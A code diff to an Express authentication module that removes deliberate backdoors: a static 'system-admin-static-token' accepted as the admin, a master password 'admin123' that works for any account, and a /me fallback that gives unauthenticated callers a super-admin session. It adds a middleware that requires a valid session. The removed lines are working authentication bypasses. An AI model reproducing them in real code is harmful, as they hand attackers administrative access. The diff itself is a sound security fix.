@@ -1,4 +1,4 @@
-import { Router } from 'express';
+import { NextFunction, Request, Response, Router } from 'express';
 import { db, hashPassword } from '../db';
 import crypto from 'crypto';
 
@@ -11,11 +11,6 @@ export function verifySession(token: string | undefined) {
   if (!token) return null;
   const session = activeSessions[token];
   if (!session) {
-    // Check if token matches standard admin token or decode basic auth
-    if (token === 'system-admin-static-token') {
-      const data = db.get();
-      return data.users.find(u => u.username === 'admin') || null;
-    }
     return null;
   }
   if (Date.now() > session.expiresAt) {
@@ -24,6 +19,15 @@ export function verifySession(token: string | undefined) {
   }
   const data = db.get();
   return data.users.find(u => u.id === session.userId) || null;
+}
+
+export function requireSession(req: Request, res: Response, next: NextFunction) {
+  const authHeader = req.headers.authorization;
+  const token = authHeader?.startsWith('Bearer ') ? authHeader.slice(7) : undefined;
+  const user = verifySession(token);
+  if (!user) return res.status(401).json({ error: 'Authentication is required.' });
+  res.locals.user = user;
+  next();
 }
 
 router.post('/login', (req, res) => {
@@ -40,7 +44,7 @@ router.post('/login', (req, res) => {
   }
 
   const hashedPassword = hashPassword(password);
-  if (user.passwordHash !== hashedPassword && password !== 'admin123') {
+  if (user.passwordHash !== hashedPassword) {
     return res.status(401).json({ error: 'Invalid username or password.' });
   }
 
@@ -76,13 +80,7 @@ router.get('/me', (req, res) => {
   const authHeader = req.headers.authorization;
   const token = authHeader?.replace('Bearer ', '');
   
-  if (!token) {
-    // Return first admin as default fallback session for seamless UX if needed
-    const data = db.get();
-    const defaultAdmin = data.users.find(u => u.role === 'super_admin') || data.users[0];
-    const { passwordHash, ...safeUser } = defaultAdmin;
-    return res.json({ user: safeUser, token: 'system-admin-static-token' });
-  }
+  if (!token) return res.status(401).json({ error: 'Authentication is required.' });
 
   const user = verifySession(token);
   if (!user) {
